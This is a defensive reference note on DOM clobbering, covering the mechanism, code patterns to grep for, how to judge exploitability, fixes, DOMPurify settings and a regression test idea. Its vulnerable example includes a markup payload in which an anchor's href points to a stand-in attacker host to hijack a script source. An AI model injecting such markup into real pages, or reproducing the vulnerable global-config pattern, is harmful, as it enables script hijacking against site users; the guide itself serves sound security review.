# DOM Clobbering

## Mechanism
Browsers expose elements with an `id` (and some with a `name`) as properties on `window` and `document`. If code reads a global or `document.x` that is not defined, an attacker who can inject *markup* (even sanitizer-approved markup with only `id`/`name`/`href`) can supply a DOM node instead. Nesting (`<form id=a><input name=b>`) and `<a>` collections with the same id (`window.a.b`) allow multi-level clobbering; an `<a>`'s `toString()` yields its `href`, so clobbered values used as URLs become attacker-controlled strings.

Impact is usually: script/URL hijack (`script.src = window.config.url`), security-flag bypass (`if (window.isAdmin)`), sanitizer or library config override, and turning "HTML injection without script" into script execution via a gadget.

## What to grep for
- Reads of undeclared globals with fallbacks: `window.X || default`, `if (!window.X)`, `typeof X === 'undefined'`
- `document.getElementById(...)` results used without type checks, `document.forms.x`, `document.x`, `document.anchors`
- Config read from globals: `window.CONFIG`, `window.APP`, `window.__INITIAL__`
- Library gadgets: older Closure, Vue 2 compiler paths, jQuery plugins reading `$.fn` options from DOM; check dependency advisories
- `innerHTML` / `dangerouslySetInnerHTML` / `v-html` / DOMPurify with `id`/`name` allowed, rendering untrusted content
- `<base>` injection potential (no `base-uri` CSP)

## Judging exploitability
Needs both: (1) attacker can get an element with chosen `id`/`name` into the page, and (2) code reads a same-named global/property **before** it is set or without a type check. If the app never renders untrusted HTML, downgrade to hardening. User-generated content areas (comments, bios, markdown, email bodies) raise severity.

## Vulnerable vs fixed
```js
// Vulnerable: attacker injects <a id=cfg><a id=cfg name=url href="https://evil.example/x.js">
const url = (window.cfg || {}).url || '/default.js';
const s = document.createElement('script'); s.src = url;

// Fixed: declare explicitly and validate type
const cfg = Object.freeze({ url: '/default.js' });   // module scope, not window
if (typeof cfg.url !== 'string' || !cfg.url.startsWith('/')) throw new Error('bad config');
```
Other fixes:
- Never read configuration from `window`/`document` properties; use module-scoped constants.
- Check `instanceof` / `typeof` before using DOM-derived values (`el instanceof HTMLInputElement`).
- Sanitize with `DOMPurify` defaults (`SANITIZE_DOM: true`, which strips clobbering names) and avoid `SANITIZE_NAMED_PROPS: false`. If `id`/`name` are not needed in user content, forbid them: `FORBID_ATTR: ['id','name']`. If needed, use `SANITIZE_NAMED_PROPS: true` to prefix them.
- Add `base-uri 'none'` (or `'self'`) to CSP.
- Use `Object.hasOwn(window, 'x')` style checks when probing globals, but prefer not probing.

## False positives
Framework-rendered apps (React/Vue) that never inject raw HTML and never read window globals are generally not exposed. React escapes text; risk comes from `dangerouslySetInnerHTML` and third-party scripts.

## Regression test idea
Render the sanitized output of `<img name=cfg>` / `<a id=cfg>` in jsdom, then assert `window.cfg` is not an Element or that the app's config read ignores it.
